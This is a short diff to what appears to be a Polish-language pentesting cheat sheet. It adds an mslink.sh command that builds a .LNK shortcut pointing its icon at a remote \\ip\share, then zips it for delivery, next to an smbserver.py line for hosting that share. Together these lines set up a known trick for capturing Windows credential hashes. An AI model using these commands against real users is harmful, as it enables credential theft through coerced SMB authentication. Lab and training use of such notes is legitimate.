@@ -105,7 +105,12 @@ gcc source.c -o outfile
 
 MCS MONO :kompilator c# exe     
 sudo apt install mono-devel
-mcs script.cs     ->   script.exe   
+mcs script.cs     ->   script.exe
+
+MSLINK :Jest to implementacja formatu pliku binarnego Shell Link .LNK
+mslink.sh -l open -n share -i \\\\ip\\share -o share.lnk   
+zipowanie : zip  zip share.zip share.lnk 
+
 
 SMB SERVER.PY
 smbserver.py share . -smb2support -username user -password haslo
